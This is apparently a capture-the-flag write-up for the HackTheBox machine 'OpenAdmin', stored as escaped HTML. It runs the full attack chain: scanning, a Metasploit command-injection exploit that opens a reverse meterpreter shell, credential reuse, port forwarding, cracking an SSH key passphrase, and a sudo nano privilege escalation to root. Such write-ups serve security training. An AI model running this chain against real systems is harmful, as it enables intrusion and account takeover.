&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@openadmin:/opt/ona/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /home 
drwxr-xr-x  4 root   root   4096 Nov 22 18:00 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 24 root   root   4096 Nov 21 13:41 ..
drwxr-x---  6 jimmy  jimmy  4096 May  1 00:44 jimmy
drwxr-x---  6 joanna joanna 4096 May  1 02:43 joanna&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;With these 2 usernames and the password I found, I manually tried each possible combination and managed to log into &lt;code class=&quot;highlighter-rouge&quot;&gt;jimmy&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh jimmy@openadmin.htb
jimmy@openadmin.htb&lt;span class=&quot;s1&quot;&gt;'s password: n1nj4W4rri0R!
...
jimmy@openadmin:~$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Unfortunately, &lt;code class=&quot;highlighter-rouge&quot;&gt;jimmy&lt;/code&gt; doesn’t have the &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;, which means that &lt;code class=&quot;highlighter-rouge&quot;&gt;joanna&lt;/code&gt; has it.&lt;/p&gt;

&lt;p&gt;It was hard to figure where to go next so I did some basic enumeration and found a very interesting port &lt;code class=&quot;highlighter-rouge&quot;&gt;52846&lt;/code&gt; that was only exposed on the localhost interface.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;jimmy@openadmin:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;netstat &lt;span class=&quot;nt&quot;&gt;-peanut&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Active Internet connections &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;servers and established&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      111        20279      -                   
tcp        0      0 127.0.0.1:52846         0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      0          20231      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      101        16729      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      0          20036      -               
...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Lets see if we can scan this port and see what service is running on it. But first, we will need to perform SSH port forwarding to our machine.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 1337:localhost:52846 jimmy@openadmin.htb
jimmy@openadmin.htb&lt;span class=&quot;s1&quot;&gt;'s password: n1nj4W4rri0R!

$ nmap -sV -sT -sC -p 1337 127.0.0.1
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-01 03:31 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000075s latency).

PORT     STATE SERVICE VERSION
1337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Tutorialspoint.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.01 seconds&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;There’s a website on that port! Lets try visiting it using our browser.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/openadmin4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried with the credentials I have so far and none of them worked, so I went to check the &lt;code class=&quot;highlighter-rouge&quot;&gt;apache2&lt;/code&gt; configs to see where are the webpages being stored at.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;jimmy@openadmin:/etc/apache2/sites-available&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; 
total 24
drwxr-xr-x 2 root root 4096 Nov 23 17:13 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 8 root root 4096 Nov 21 14:08 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root 6338 Jul 16  2019 default-ssl.conf
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root  303 Nov 23 17:13 internal.conf
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root 1329 Nov 22 14:24 openadmin.conf&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Checking each of the config, we find out that the web pages are at &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/internal&lt;/code&gt; and we also see some hints of &lt;code class=&quot;highlighter-rouge&quot;&gt;joanna&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;jimmy@openadmin:/etc/apache2/sites-available&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;internal.conf
Listen 127.0.0.1:52846

&amp;lt;VirtualHost 127.0.0.1:52846&amp;gt;
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

&amp;lt;IfModule mpm_itk_module&amp;gt;
AssignUserID joanna joanna
&amp;lt;/IfModule&amp;gt;

    ErrorLog &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;APACHE_LOG_DIR&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;/error.log
    CustomLog &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;APACHE_LOG_DIR&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;/access.log combined

&amp;lt;/VirtualHost&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In the directory were 3 files.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;jimmy@openadmin:/var/www/internal&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; 
total 20
drwxrwx--- 2 jimmy internal 4096 Nov 23 17:43 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 4 root  root     4096 Nov 22 18:15 ..
&lt;span class=&quot;nt&quot;&gt;-rwxrwxr-x&lt;/span&gt; 1 jimmy internal 3229 Nov 22 23:24 index.php
&lt;span class=&quot;nt&quot;&gt;-rwxrwxr-x&lt;/span&gt; 1 jimmy internal  185 Nov 23 16:37 logout.php
&lt;span class=&quot;nt&quot;&gt;-rwxrwxr-x&lt;/span&gt; 1 jimmy internal  339 Nov 23 17:40 main.php&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;index.php&lt;/code&gt;, we find the code used for the login page and the username and password hash were hard-coded in it!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;jimmy@openadmin:/var/www/internal&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;index.php
&amp;lt;?php
  &lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;isset&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'login'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;empty&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;empty&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'jimmy'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sha512'&lt;/span&gt;,&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'jimmy'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location: /main.php&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Wrong username or password.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If we lookup the hash online, we get “Revealed”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/openadmin5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, if we enter “jimmy” as the username and “Revealed” as the password,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/openadmin6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We got in! And we got a SSH private key?&lt;/p&gt;

&lt;p&gt;Checking the code for &lt;code class=&quot;highlighter-rouge&quot;&gt;main.php&lt;/code&gt;(which was the the page we were redirected to),&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;jimmy@openadmin:/var/www/internal&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;main.php
&amp;lt;?php session_start&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;isset &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location: /index.php&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
&lt;span class=&quot;c&quot;&gt;# Open Admin Trusted
&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# OpenAdmin
&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; shell_exec&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cat /home/joanna/.ssh/id_rsa'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;pre&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;/pre&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The private key belongs to user &lt;code class=&quot;highlighter-rouge&quot;&gt;joanna&lt;/code&gt;. Lets try &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt;ing using it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;700 id_rsa 
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa joanna@openadmin.htb
Enter passphrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;key &lt;span class=&quot;s1&quot;&gt;'id_rsa'&lt;/span&gt;: &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The private key is protected with a passphrase, so we use &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh2john&lt;/code&gt; along with &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; to crack the passphrase&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python /usr/share/john/ssh2john.py id_rsa &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; joanna.hash
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt joanna.hash 
Using default input encoding: UTF-8
Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSH &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RSA/DSA/EC/OPENSSH &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSH private keys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 32/64]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Cost 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;KDF/cipher &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MD5/AES &lt;span class=&quot;nv&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MD5/3DES &lt;span class=&quot;nv&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Bcrypt/AES]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 0 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
Cost 2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;iteration count&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 1 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
Will run 6 OpenMP threads
Note: This format may emit &lt;span class=&quot;nb&quot;&gt;false &lt;/span&gt;positives, so it will keep trying even after
finding a possible candidate.
Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
bloodninjas      &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;id_rsa&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
1g 0:00:00:05 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2020-05-01 05:12&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.1858g/s 2665Kp/s 2665Kc/s 2665KC/s     1990..&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;7¡Vamos!
Session completed&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1 id=&quot;usertxt&quot;&gt;user.txt&lt;/h1&gt;

&lt;p&gt;Now, we can finally get our &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa joanna@openadmin.htb
Enter passphrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;key &lt;span class=&quot;s1&quot;&gt;'id_rsa'&lt;/span&gt;: bloodninjas
...
joanna@openadmin:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
c9b2XXXXXXXXXXXXXXXXXXXXXXXXXXXX&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1 id=&quot;enumeration-2&quot;&gt;Enumeration (2)&lt;/h1&gt;

&lt;p&gt;If we list the commands we can run &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; with,&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;joanna@openadmin:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;joanna on openadmin:
    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User joanna may run the following commands on openadmin:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /bin/nano /opt/priv&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1 id=&quot;roottxt&quot;&gt;root.txt&lt;/h1&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;joanna&lt;/code&gt; can run &lt;code class=&quot;highlighter-rouge&quot;&gt;nano&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;! And according to &lt;a href=&quot;https://gtfobins.github.io/gtfobins/nano/&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;GTFOBins&lt;/code&gt;&lt;/a&gt;, we can spawn a shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Creating &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/priv&lt;/code&gt; and running &lt;code class=&quot;highlighter-rouge&quot;&gt;nano&lt;/code&gt; using &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/priv&lt;/code&gt;:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;joanna@openadmin:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; /opt/priv
joanna@openadmin:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /bin/nano /opt/priv&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Doing &lt;code class=&quot;highlighter-rouge&quot;&gt;Ctrl+R&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Ctrl+X&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/openadmin7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Executing the magical string and getting the flag:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/openadmin8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Rooted ! Thank you for reading and look forward for more writeups and articles !&lt;/p&gt;</content><author><name></name></author><summary type="html">Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. $ echo &quot;10.10.10.171 openadmin.htb&quot; &amp;gt;&amp;gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. $ nmap -sV -sT -sC openadmin.htb tarting Nmap 7.80 ( https://nmap.org ) at 2020-01-10 11:35 EST Nmap scan report for openadmin.htb (10.10.10.171) Host is up (0.46s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http? Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 262.61 seconds Enumeration (1) Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, maybe we can find some information on it ? Nothing much here so lets bruteforce some directories using gobuster. $ gobuster dir -u http://openadmin.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -k -q ... /music (Status: 301) /artwork (Status: 301) /sierra (Status: 301) There’s a few places to check out but lets take a look at /music first. Mostly static pages but after much “crawling” around, I found /ona by clicking on the “Login” button only on the index page? We are presented with the UI for OpenNetAdmin. OpenNetAdmin provides a database managed inventory of your IP network. Each subnet, host, and IP can be tracked via a centralized AJAX enabled web interface that can help reduce tracking errors. From the UI, we can see that the version of OpenNetAdmin installed on the box is v18.1.1. With that knowledge, I used searchsploit to search for any possible exploit for this version. searchsploit OpenNetAdmin 18.1.1 ----------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) ----------------------------------------------------------------------------------- ---------------------------------------- OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit) | exploits/php/webapps/47772.rb OpenNetAdmin 18.1.1 - Remote Code Execution | exploits/php/webapps/47691.sh ----------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result Papers: No Result I will be using the Metasploit module for this one. $ msfconsole msf5 &amp;gt; search opennetadmin Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/unix/webapp/opennetadmin_ping_cmd_injection 2019-11-19 excellent Yes OpenNetAdmin Ping Command Injection msf5 &amp;gt; use exploit/unix/webapp/opennetadmin_ping_cmd_injection msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &amp;gt; set RHOSTS openadmin.htb RHOSTS =&amp;gt; openadmin.htb msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &amp;gt; set LHOST tun0 LHOST =&amp;gt; 10.10.XX.XX msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &amp;gt; run [*] Started reverse TCP handler on 10.10.XX.XX:4444 [*] Exploiting... [*] Command Stager progress - 100.00% done (703/703 bytes) [*] Exploit completed, but no session was created. Hmm no session? Lets use a 64-bit payload instead. msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &amp;gt; set payload linux/x64/meterpreter/reverse_tcp payload =&amp;gt; linux/x64/meterpreter/reverse_tcp msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &amp;gt; run [*] Started reverse TCP handler on 10.10.XX.XX:4444 [*] Exploiting... [*] Sending stage (3012516 bytes) to 10.10.10.171 [*] Meterpreter session 1 opened (10.10.XX.XX:4444 -&amp;gt; 10.10.10.171:48498) at 2020-04-30 22:45:18 -0400 [*] Command Stager progress - 100.00% done (808/808 bytes) meterpreter &amp;gt; getuid Server username: no-user @ openadmin (uid=33, gid=33, euid=33, 